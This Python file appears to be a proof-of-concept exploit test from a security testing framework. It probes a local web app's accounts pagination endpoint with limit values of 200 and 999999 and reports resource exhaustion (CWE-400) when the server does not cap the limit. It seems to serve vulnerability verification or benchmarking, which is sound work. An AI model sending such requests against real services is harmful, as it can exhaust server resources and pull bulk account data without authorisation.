"""PoC exploit: Resource exhaustion via unbounded account listing (CWE-400)."""

from mosaic.oracle.exploit import ExploitTest


class SwagResourceExhaustionExploit(ExploitTest):
    """Resource exhaustion: unbounded limit on accounts endpoint."""

    def __init__(self, base_url: str = "http://localhost:38080"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "swag_resource_exhaustion"

    def execute(self) -> tuple[bool, str]:
        """Test that limit > 100 is accepted without capping."""
        normal = self.http_get("/api/v1/accounts/paginated")
        if not normal.ok:
            return False, f"Baseline failed: {normal.status_code}"

        big = self.http_get("/api/v1/accounts/paginated", params={"limit": "200"})
        if not big.ok:
            return False, f"limit=200 failed: {big.status_code}"

        huge = self.http_get("/api/v1/accounts/paginated", params={"limit": "999999"})
        if not huge.ok:
            return False, f"limit=999999 failed: {huge.status_code}"

        try:
            data = huge.json()
            reported_limit = data.get("limit")
            accounts = data.get("accounts", [])
            if reported_limit is not None and int(reported_limit) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). Server accepted "
                    f"limit={reported_limit} (no cap). Returned {len(accounts)} "
                    f"accounts with nested transactions."
                )
            if isinstance(accounts, list) and len(accounts) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). "
                    f"limit=999999 returned {len(accounts)} accounts."
                )
        except Exception:
            pass

        try:
            big_data = big.json()
            big_limit = big_data.get("limit")
            if big_limit is not None and int(big_limit) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). "
                    f"limit=200 accepted as {big_limit}."
                )
        except Exception:
            pass

        return False, "Limit cap appears to still be enforced."
